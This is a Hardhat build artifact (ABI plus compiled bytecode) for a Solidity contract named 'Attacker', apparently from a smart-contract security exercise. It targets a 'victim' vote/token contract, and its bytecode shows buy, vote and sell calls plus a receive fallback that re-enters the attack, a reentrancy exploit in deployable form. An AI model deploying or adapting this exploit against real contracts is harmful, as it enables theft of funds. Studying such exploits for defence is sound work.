{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/Attacker/Attacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_victimContract",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_priceToVote",
          "type": "uint256"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "Received",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "initiateAttack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "priceToVote",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161079d38038061079d833981810160405281019061003291906100eb565b81600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600181905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610191565b6000815190506100d081610163565b92915050565b6000815190506100e58161017a565b92915050565b600080604083850312156100fe57600080fd5b600061010c858286016100c1565b925050602061011d858286016100d6565b9150509250929050565b600061013282610139565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b61016c81610127565b811461017757600080fd5b50565b61018381610159565b811461018e57600080fd5b50565b6105fd806101a06000396000f3fe6080604052600436106100385760003560e01c80638da5cb5b146100de578063bde0604314610109578063e0a1f3c814610134576100d9565b366100d9573073ffffffffffffffffffffffffffffffffffffffff1663e0a1f3c8346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561008557600080fd5b505af1158015610099573d6000803e3d6000fd5b50505050507f88a5966d370b9919b20f3e2c13ff65706f196a4e32cc2c12bf57088f8852587433346040516100cf9291906104fb565b60405180910390a1005b600080fd5b3480156100ea57600080fd5b506100f361013e565b60405161010091906104e0565b60405180910390f35b34801561011557600080fd5b5061011e610162565b60405161012b9190610524565b60405180910390f35b61013c610168565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a346040518263ffffffff1660e01b81526004016020604051808303818588803b1580156101d257600080fd5b505af11580156101e6573d6000803e3d6000fd5b50505050506040513d601f19601f8201168201806040525081019061020b9190610446565b50600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630121b93f6001546040518263ffffffff1660e01b81526004016102699190610524565b602060405180830381600087803b15801561028357600080fd5b505af1158015610297573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102bb9190610446565b506000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161031991906104c5565b60206040518083038186803b15801561033157600080fd5b505afa158015610345573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610369919061046f565b9050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b32826040518263ffffffff1660e01b81526004016103c69190610524565b602060405180830381600087803b1580156103e057600080fd5b505af11580156103f4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104189190610446565b5050565b60008151905061042b81610599565b92915050565b600081519050610440816105b0565b92915050565b60006020828403121561045857600080fd5b60006104668482850161041c565b91505092915050565b60006020828403121561048157600080fd5b600061048f84828501610431565b91505092915050565b6104a181610551565b82525050565b6104b08161053f565b82525050565b6104bf8161058f565b82525050565b60006020820190506104da60008301846104a7565b92915050565b60006020820190506104f56000830184610498565b92915050565b600060408201905061051060008301856104a7565b61051d60208301846104b6565b9392505050565b600060208201905061053960008301846104b6565b92915050565b600061054a8261056f565b9050919050565b600061055c8261056f565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6105a281610563565b81146105ad57600080fd5b50565b6105b98161058f565b81146105c457600080fd5b5056fea264697066735822122025bb5431033b6b87bb0a11cca425022f7e337752851e9810f2bf88e45391442464736f6c63430008040033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}